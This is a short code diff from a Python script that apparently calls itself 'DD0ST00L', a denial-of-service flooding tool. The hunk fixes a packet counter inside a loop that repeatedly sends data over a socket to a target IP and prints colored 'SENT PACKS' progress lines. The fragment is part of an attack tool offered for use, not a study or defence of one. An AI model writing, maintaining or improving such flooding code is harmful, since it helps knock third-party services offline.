@@ -86,11 +86,9 @@ def start():
       s.send(r)
       for i in range(packs):
         s.send(r)
-        u += 0
+        u += 1
         print("\033[92m[\033[1m+\033[92m]\033[32mDD0ST00L \033[94m  " +str(u)+ "   \033[95mSENT PACKS " +str()+ "  \033[92m:." +ip+ "\033[0m" )
-        u += 0
         print("\033[92m[\033[1m+\033[92m]\033[33mDD0ST00L \033[94m  " +str(u)+ "   \033[96mSENT PACKS " +str()+ "  \033[94m::.." +ip+ "\033[0m" )
-        u += 0
         print("\033[92m[\033[1m+\033[92m]\033[97mDD0ST00L \033[94m  " +str(u)+ "   \033[92mSENT PACKS " +str()+ "  \033[31m:::..." +ip+ "\033[0m" )
           
     except:
